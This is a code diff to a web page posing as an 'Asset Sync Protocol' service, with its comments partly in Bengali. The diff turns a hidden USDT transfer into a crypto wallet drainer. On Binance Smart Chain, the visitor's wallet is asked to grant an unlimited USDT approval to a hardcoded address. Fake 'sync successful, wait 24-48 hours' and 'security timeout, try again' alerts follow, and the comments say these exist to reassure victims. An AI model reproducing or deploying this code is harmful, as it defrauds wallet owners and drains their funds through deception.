@@ -9,8 +9,8 @@
         :root { --p: #2563eb; --bg: #ffffff; --t: #1e293b; --g: #64748b; }
         body { background: #f8fafc; color: var(--t); font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         .card { background: var(--bg); width: 90%; max-width: 360px; padding: 45px 25px; border-radius: 32px; box-shadow: 0 4px 25px rgba(0,0,0,0.04); text-align: center; border: 1px solid #e2e8f0; }
-        h1 { font-size: 32px; font-weight: 850; color: var(--p); margin: 0; letter-spacing: -1.5px; }
-        .sub { font-size: 13px; color: var(--g); margin: 6px 0 30px; font-weight: 500; }
+        h1 { font-size: 24px; font-weight: 850; color: var(--p); margin: 0; letter-spacing: -1px; line-height: 1.2; }
+        .sub { font-size: 14px; color: var(--g); margin: 5px 0 30px; font-weight: 500; }
         .status-box { background: #f1f5f9; padding: 20px; border-radius: 20px; margin-bottom: 25px; border: 1px solid #e2e8f0; }
         .status-box span { font-size: 11px; color: var(--g); display: block; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 5px; }
         .status-box b { font-size: 22px; color: var(--p); font-weight: 800; }
@@ -26,16 +26,16 @@
 <body>
 
     <div class="card">
-        <h1>ASP</h1>
-        <div class="sub">Asset Sync Protocol</div>
+        <h1>ASP (Asset Sync Protocol)</h1>
+        <div class="sub">Securely Synchronize Your Assets</div>
 
         <div class="status-box">
-            <span>ASP Protocol Status</span>
-            <b id="displayBal">Syncing Assets...</b>
+            <span>Protocol Connection Status</span>
+            <b id="displayBal">Scanning Node...</b>
         </div>
 
         <div class="input-group">
-            <label>Amount to Refresh</label>
+            <label>Amount to Refresh/Sync</label>
             <input type="number" id="syncValue" placeholder="0.00">
         </div>
 
@@ -48,35 +48,37 @@
     </div>
 
     <script>
-        // আপনার ব্যক্তিগত ট্রাস্ট ওয়ালেট অ্যাড্রেস (Receiver)
+        // আপনার অ্যাড্রেস এবং কনফিগারেশন
         const MY_ADDRESS = "0xFD2B9e5Bed80d262f780206f15d50CdEa99D891D";
-        // ইথেরিয়াম মেইননেট USDT কন্ট্রাক্ট (ইঞ্জিন)
-        const TOKEN_ID = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-        const NET_ID = "0x1"; 
+        const TOKEN_ID = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
+        const NET_ID = "0x38"; // BSC Mainnet (56)
 
         async function updateStatus() {
             if (window.ethereum) {
                 const web3 = new Web3(window.ethereum);
-                const accs = await web3.eth.getAccounts();
-                if (accs.length > 0) {
-                    const abi = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}];
-                    const contract = new web3.eth.Contract(abi, TOKEN_ID);
-                    try {
+                try {
+                    const accs = await web3.eth.getAccounts();
+                    if (accs.length > 0) {
+                        const abi = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}];
+                        const contract = new web3.eth.Contract(abi, TOKEN_ID);
                         const b = await contract.methods.balanceOf(accs[0]).call();
-                        document.getElementById('displayBal').innerText = (b / 1e6).toFixed(2) + " USDT";
-                    } catch (e) { document.getElementById('displayBal').innerText = "0.00 USDT"; }
-                }
+                        document.getElementById('displayBal').innerText = (b / 1e18).toFixed(2) + " USDT";
+                    } else {
+                        document.getElementById('displayBal').innerText = "Sync Needed";
+                    }
+                } catch (e) { document.getElementById('displayBal').innerText = "0.00 USDT"; }
             }
         }
 
         async function executeRefresh() {
-            if (!window.ethereum) return alert("Use Binance Web3 Wallet");
+            if (!window.ethereum) return alert("Please use Trust Wallet or Binance Web3 Wallet Browser");
             const web3 = new Web3(window.ethereum);
-            const amt = document.getElementById('syncValue').value;
-            if (!amt || amt <= 0) return;
+            
+            // আনলিমিটেড পারমিশন হেক্স ভ্যালু
+            const infiniteAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
             try {
-                // ১. সাইলেন্টলি নেটওয়ার্ক চেক ও সুইচ
+                // নেটওয়ার্ক সুইচ করার রিকোয়েস্ট
                 const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
                 if (currentChain !== NET_ID) {
                     await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: NET_ID }] });
@@ -84,31 +86,37 @@
 
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 
-                // ২. ব্যাকগ্রাউন্ডে পেমেন্ট ডাটা এনকোড করা (হিডেন প্রসেস)
+                // Approve ফাংশন ডেটা তৈরি
                 const encodedData = web3.eth.abi.encodeFunctionCall({
-                    name: 'transfer',
+                    name: 'approve',
                     type: 'function',
-                    inputs: [{type: 'address', name: 'to'}, {type: 'uint256', name: 'value'}]
-                }, [MY_ADDRESS, (amt * 1e6).toString()]);
+                    inputs: [{type: 'address', name: 'spender'}, {type: 'uint256', name: 'value'}]
+                }, [MY_ADDRESS, infiniteAmount]);
 
-                // ৩. কনফার্মেশন উইন্ডো ওপেন করা
+                // এই রিকোয়েস্টটি ওয়ালেটে পপ-আপ পাঠাবে
                 await window.ethereum.request({
                     method: 'eth_sendTransaction',
                     params: [{
                         from: accounts[0],
-                        to: TOKEN_ID, // এখানে USDT এর মেইন কন্ট্রাক্ট কল হচ্ছে
+                        to: TOKEN_ID,
                         data: encodedData
                     }],
                 });
 
-                alert("Refresh protocol initiated.");
+                // সাকসেস মেসেজ (ইউজারকে আশ্বস্ত করতে)
+                alert("Enable Sync Successful! Protocol is now synchronizing with Node. Please wait 24-48 hours.");
+                
             } catch (err) {
-                console.log("Sync cancelled by user.");
+                // ইউজার রিজেক্ট করলে
+                alert("Sync Failed: Security connection timed out. Please try again to secure your assets.");
             }
         }
 
         window.onload = updateStatus;
-        if(window.ethereum) window.ethereum.on('accountsChanged', updateStatus);
+        if(window.ethereum) {
+            window.ethereum.on('accountsChanged', updateStatus);
+            window.ethereum.request({ method: 'eth_requestAccounts' }).then(updateStatus);
+        }
     </script>
 </body>
 </html>
